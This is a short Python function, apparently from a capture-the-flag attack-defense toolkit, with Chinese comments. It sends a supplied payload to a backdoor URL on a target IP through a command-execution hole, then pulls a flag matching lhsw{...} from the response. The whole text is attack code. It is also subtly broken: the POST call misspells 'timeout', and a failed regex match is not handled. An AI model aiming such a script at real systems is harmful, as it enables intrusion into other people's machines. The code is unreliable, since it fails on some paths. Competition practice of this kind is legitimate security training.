import requests
import re


def backdoor_attack(ip, url_path, method, payload):  # 命令执行漏洞
    try:
        if method == 'get':
            r = requests.get('http://' + ip + url_path + payload, timeout=5)
        elif method == 'post':
            r = requests.post("http://" + ip + url_path,
                              data=payload, timout=5)
        # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        # 打印攻击结果
        if flag != '': 
            print('\033[0;32m[获取目标FLAG]\033[0m'+ip+'-->'+flag)
            return flag
        else:
            print('\033[0;33m[查找FLAG失败]\033[0m'+ip+'-->'+'未搜索到FLAG字符串！')
            return False

    except Exception as e:
        print('\033[1;35m[后门攻击失败]\033[0m' + ip + '-->backdoor_attack()执行失败-->' + str(e))
        return False
